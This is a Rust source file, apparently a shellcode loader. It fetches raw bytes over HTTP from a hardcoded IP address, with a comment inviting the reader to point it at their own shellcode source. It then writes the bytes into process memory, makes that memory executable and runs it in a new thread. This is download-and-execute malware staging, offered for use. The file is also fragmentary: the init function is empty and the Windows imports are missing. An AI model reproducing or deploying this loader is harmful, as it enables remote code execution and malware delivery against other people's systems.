mod injectors;
use injectors::{
    InjectorType,
    Injector
};

pub fn init(injector_type: InjectorType ) -> Box<dyn Injector> {

}

use reqwest::blocking::get;

// Change this to your shellcode source!
const URL: &str = "http://192.168.1.114:8443/foo";

fn inject(sc: Vec<u8>) {
    unsafe {
        let h: HANDLE = GetCurrentProcess();
            let sc_len = sc.len();
            
            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            
            let mut n = 0;
            WriteProcessMemory(h, addr, sc.as_ptr() as  _, sc.len(), Some(&mut n));

            let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
            VirtualProtectEx(
                h,
                addr,
                sc_len,
                PAGE_EXECUTE_READ,
                &mut old_protect
            );

            
            let h_thread = CreateRemoteThread(
                h, 
                None, 
                0, 
                Some(std::mem::transmute(addr)), 
                None,
                0, 
                None
            )
            .unwrap();
            
            
            CloseHandle(h);

            if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
                println!("Good!");
                println!("Injection completed!");
                return;
            } else {
                let error = GetLastError();
                println!("{:?}", error);
                return;
            }
       
    }
}

fn get_inject_shellcode(url: &str) {
    if let Ok(res) = get(url) {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
            inject(sc);
        }
    }
}